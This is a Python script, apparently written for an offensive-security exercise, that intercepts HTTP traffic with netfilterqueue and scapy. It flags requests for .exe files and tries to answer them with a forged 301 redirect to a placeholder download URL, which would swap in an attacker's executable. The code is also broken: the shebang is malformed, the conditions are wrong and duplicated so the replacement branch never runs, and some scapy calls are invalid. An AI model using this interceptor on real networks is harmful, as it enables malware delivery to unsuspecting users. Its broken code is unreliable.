#!usr/bin/env python

import netfilterqueue
import scapy.all as scapy


ack_list = []


def set_load(spacket, location):
    spacket[scapy.Raw].load = location
    del spacket[scapy.TCP].chksum
    del spacket[scapy.IP].len
    del spacket[scapy.IP].chksum
    return spacket


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy.Raw in scapy_packet and scapy.TCP.dport == 80 in scapy_packet:
        #if scapy_packet[scapy.TCP].dport == 80:
            if ".exe".encode() in scapy_packet[scapy.Raw].load:
                print("[+] .EXE Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy.Raw in scapy_packet and scapy.TCP.dport == 80 in scapy_packet:
            if scapy_packet(scapy.TCP).seq in ack_list:
                ack_list.remove(scapy_packet(scapy.TCP).seq)
                print("[+] Replacing ACK/SEQ")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: Download URL for exe")
                packet.set_payload(modified_packet)

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


